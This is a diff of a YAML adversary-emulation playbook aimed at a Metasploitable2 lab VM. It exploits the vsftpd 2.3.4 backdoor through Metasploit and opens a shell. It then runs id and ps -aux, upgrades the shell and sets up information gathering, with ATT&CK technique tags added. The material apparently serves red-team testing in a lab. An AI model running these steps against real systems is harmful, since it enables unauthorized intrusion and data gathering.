@@ -15,28 +15,39 @@
 #     3. Target a Metasploitable2-VM
 #
 vars:
-  METASPLOITABLE: 172.17.0.106
-  ATTACKER: 172.17.0.127
-  PAYLOAD: cmd/unix/interact
+  METASPLOITABLE: 192.168.0.146
+  ATTACKER: 192.168.0.29
+  PAYLOAD: payload/cmd/unix/interact
   INCLUDE_PATH: ./playbooks/includes
 
 commands:
   - type: debug
     cmd: "Please note that 'exploit/unix/ftp/vsftpd_234_backdoor' takes a while and might not always work"
+    metadata:
+      description: "Print information about this playbook"
 
   # Exploit backdoor in vsftpd
   - type: msf-module
     creates_session: shell
     cmd: exploit/unix/ftp/vsftpd_234_backdoor
-    payload: $PAYLOAD
+      #payload: $PAYLOAD
     options:
       RHOSTS: $METASPLOITABLE
-      RPORT: 21
+      RPORT: "21"
+    metadata:
+      description: "Exploit vsftpd using an existing backdoor"
+      techniques: "T1190,T1195.002,T1059.004"
+      tactics: "Initial Access,Execution"
+
 
   # Run command in spawned shell
   - type: msf-session
     session: shell
     cmd: id
+    metadata:
+      description: "Verify shell access"
+      techniques: "T1033"
+      tactics: "Discovery"
 
   # set variable UPGRADESESSION
   # the included upgrade_shell.yml depends
@@ -44,16 +55,23 @@ commands:
   - type: setvar
     cmd: shell
     variable: UPGRADESESSION
+    metadata:
+      description: "Set UPGRADESESSION variable for the upgrade_shell playbook"
 
   # include commands from an external
   # yaml-file
   - type: include
     local_path: $INCLUDE_PATH/upgrade_shell.yml
+    metadata:
+      description: "Run all steps to upgrade the shell to a fully interactive shell"
 
   # run commands using the upgraded shell
   - type: msf-session
     session: shell
     cmd: ps -aux
+    metadata:
+      techniques: "T1057"
+      tactics: "Discovery"
 
   # set variable GATHER_SESSION
   # the included gather_commands.yml depends
@@ -61,6 +79,8 @@ commands:
   - type: setvar
     cmd: $LAST_MSF_SESSION
     variable: GATHER_SESSION
+    metadata:
+      description: "Run playbook to gather information"
 
   # include commands and gather/loot information
   - type: include
